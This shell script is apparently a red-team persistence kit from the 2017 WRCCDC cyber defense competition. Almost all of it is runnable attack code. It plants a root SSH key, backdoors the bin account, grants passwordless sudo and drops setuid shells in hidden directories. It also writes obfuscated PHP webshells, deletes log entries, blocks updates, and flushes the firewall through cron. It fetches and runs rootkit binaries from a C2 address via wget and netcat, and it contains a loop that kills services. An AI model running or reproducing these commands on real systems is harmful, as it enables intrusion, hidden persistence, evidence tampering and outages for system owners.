# DO NOT RUN THIS SCRIPT ON YOUR SYSTEM
# This is a script deployed by the WRCCDC Red Team during the 2017 Regional Event
#!/bin/sh

# root ssh key
SHARED_PUBKEY="ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABAQDaJ9LXUDqplS+AUMkXNYGuIqLwDnCeO/+UNqYyVZPm+KCKqrRf+cjAN88fzYPynKTfr5UaXOmc2y6nJKeGQTo6a0XWETdWA+En42A+BqS/2k1KJ3oqVHFHYfc6V+BlANhSOeqxcpgB+HIggW7aRtEzq/qYen/iy8yar42/ljgwy2/PzaP36EIR3OQip0vMMuFizwATsEOdYYGrzm0uDBZrmea2aHNDm9tYmRW30rrZIetqaHx54vdO3Ge2X9tb23EDPdDdNkBCqffj6mugbmkapAO5TqYwjlUOh5ilwc7cVTRydTS6dpQj5TaOwNyhqN0iv11K8+wdvBumi7ZOnvY/"

### CHANGE ME ###
# urls for webserver where kits/backdoor binaries are hosted
# file names to grab

C2_URL="http://10.128.2.51:8000/"
C2_IP="10.128.2.51"


LINUX64_FILE="client-linux-x64"
LINUX86_FILE="client-linux-x86"
LINUX64_KIT="wrccdc/$LINUX64_FILE"
LINUX86_KIT="wrccdc/$LINUX86_FILE"

#################

ARCH=`uname -i`
echo "Detected $ARCH"

do_backdoors() {

  # removing utmp
  rm -rf /var/run/utmp
  touch /var/run/utmp
  chmod 664 /var/run/utmp

  # installing root ssh key
  chattr -i /root/.ssh/authorized*
  if [ ! -d "/root/.ssh" ]; then
    mkdir /root/.ssh
  fi
  echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys2
  echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys

  # add secondary key auth file, for when they inevitably remove /root/.ssh/
  echo $SHARED_PUBKEY >> /etc/ssh/authorized_keys
  echo 'AuthorizedKeysFile /etc/ssh/authorized_keys' >> /etc/ssh/sshd_config
  echo $SHARED_PUBKEY >> /etc/ssh/authorized_keys
  chattr +i /root/.ssh/authorized_keys*

  # uncomment below to do iptables crontab shenanigans
  echo "adding 5m disable iptables crontab.."
  echo "*/5 * * * * /sbin/iptables -F" | crontab -
  if [ -d "/dev/..." ]; then
    touch -r /etc/issue /dev/...
    touch -r /etc/issue /dev/.../*
  fi

  # backdoor bin account pass=lol123
  sed -i -e 's/bin:\*:/bin:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
  usermod -s /bin/sh bin

  # make privesc easy via all service accounts via sudoers
  echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
  touch -r /etc/issue * /etc/passwd
  touch -r /etc/issue * /etc/sudoers
  groupadd admin

  # take care of logs, ie 'groupadd[31001]: new group: name=admin, GID=1005' in auth.log
  sed -ie "/groupadd/d" /var/log/auth.log /var/log/messages /var/log/secure

  # ubuntu automatically makes members of admin have sudo capabilities.
  # lets give that as an option for root to web backdoors
  usermod -G admin -a bin
  usermod -G admin -a www-data
  usermod -G admin -a httpd
  usermod -G admin -a apache

  # take care of logs, ie 'usermod[31005]: add 'bin' to group 'admin'
  sed -ie "/usermod/d" /var/log/auth.log /var/log/messages /var/log/secure

  # drop setuid /bin/sh for use with bin account & privesc
  if [ ! -d "/dev/  " ]; then
    mkdir "/dev/  "
  fi

  mkdir -p "/dev/..."
  cp /bin/bash "/dev/.../pwnd"
  chmod +s "/dev/.../pwnd"
  
  # Just in case
  cp /bin/bash /tmp/.fu
  chmod +s /tmp/.fu

  # drop webshells
  # echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/.src.php
  # old shell replaced by webacoo
  # kali: webacoo -t -u http://victimhost/.src.php
  echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > /var/www/.src.php
  chmod 444 /var/www/.src.php
  # echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/html/.src.php
  echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > /var/www/html/.src.php
  chmod 444 /var/www/html/.src.php

  # prevent all package upgrades on fedora/centos
  # all yum'ing results in "Nothing to do."
  if [ -f "/etc/yum.conf" ]; then
    echo 'exclude=*' >> /etc/yum.conf
    touch -r /etc/issue /etc/yum.conf
  fi

  # block all kernel package upgrades on ubuntu/debian
  # all apt-get use will result in "<package> has no installation candidate"
  if [ -d "/etc/apt/preferences.d" ]; then
   echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
   # blend in
   touch -r /etc/issue * /etc/apt/preferences.d/*
   touch -r /etc/issue * /etc/apt
   touch -r /etc/issue * /etc/apt/*
  fi
  if [ -f "/etc/apt/preferences" ]; then
   echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
   touch -r /etc/issue * /etc/apt
   touch -r /etc/issue * /etc/apt/*
  fi

  # prevent kernel package from being included in the autoupgrade in ubuntu
  if [ -f "/etc/apt/apt.conf.d/01autoremove" ]; then
    sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
    touch -r /etc/issue * /etc/apt/apt.conf.d/*
    touch -r /etc/issue * /etc/apt
    touch -r /etc/issue * /etc/apt/*
  fi

  echo "backdoors done."
}

do_bsdbackdoors() {
  # this was a quick hack for the pfsense firewalls
  # uses netcat vs wget because wget isnt installed on pfsense
  # by default
  echo "installing root ssh key!"
  if [ ! -d "/root/.ssh" ]; then
      mkdir /root/.ssh
  fi
  echo $PUBKEY >> /root/.ssh/authorized_keys2
  echo $PUBKEY >> /root/.ssh/authorized_keys
  chattr +i /root/.ssh/authorized_keys*
  echo "dropping rooty via netcat.."
  # NOTE: must have listening netcat with 'cat rootybsd.bin|nc -l 1338' on c2 server.
  cd /var/
  nc $C2_IP 445 > udevd
  chmod +x udevd
  env PATH=$PWD /usr/bin/nohup udevd &
  echo "dropping webshells.."
  #echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/.src.php
  echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > /var/www/.src.php
  chmod 444 /var/www/.src.php
  #echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/html/.src.php
  echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > /var/www/html/.src.php
  chmod 444 /var/www/html/.src.php
}

do_ubuntu64_rootkit() {
  echo "Retrieving ubuntu x64 kit..."
  if [ ! -d "/dev/..." ]; then
    mkdir /dev/...
  fi
  cd /dev/...
  wget $C2_URL$LINUX64_KIT
  chmod +sx "$LINUX64_FILE"
  cp "$LINUX64_FILE" /bin/Is
  nohup ./$LINUX64_FILE &
  echo "nohup /bin/Is &; exit 0" > /etc/rc.local
}

do_linux86_rootkit() {
  echo "Retrieving linux x86 kit..."
  if [ ! -d "/dev/..." ]; then
    mkdir /dev/...
  fi
  cd /dev/...
  wget $C2_URL$LINUX86_KIT
  chmod +sx "$LINUX86_FILE"
  cp "$LINUX86_FILE" /bin/Is
  nohup ./$LINUX86_FILE &
  echo "nohup /bin/Is &; exit 0" > /etc/rc.local
}

goodbye_sla() {
    cat <<EOF > /usr/share/service.sh
#!/bin/bash
#UMAD?

while [ 0 ]
do
	service httpd stop
	service postfix stop
	service sendmail stop
	service mysql stop
	service webmin stop
  service named stop
  service bind stop
	killall -9 webmin.pl
	killall -9 apache2
  killall -9 httpd
  killall -9 named
	killall -9 mysqld_safe
	killall -9 mysqld
  killall -9 qemu-kvm
  sleep 10
done
EOF
  chmod +x /usr/share/service.sh
  nohup /usr/share/service.sh >/dev/null 2>&1 &
}

if [ $ARCH  = "x86_64" ]; then
  do_backdoors
  do_ubuntu64_rootkit
  echo "Enjoy"
  exit
  #goodbye_sla
fi

if [ $ARCH != "x86_64" ]; then
  do_backdoors
  do_linux86_rootkit
  echo "Enjoy"
  exit
  #goodbye_sla
fi


# freebsd
if [ `uname`  = 'FreeBSD' ]; then
	do_bsdbackdoors
  echo "Enjoy"
  exit
fi

# If we are still here, we backdoor shit and run 32 bit client
echo "Fuck it, just unload the horseshit..."


do_linux86_rootkit
echo "Enjoy"

exit
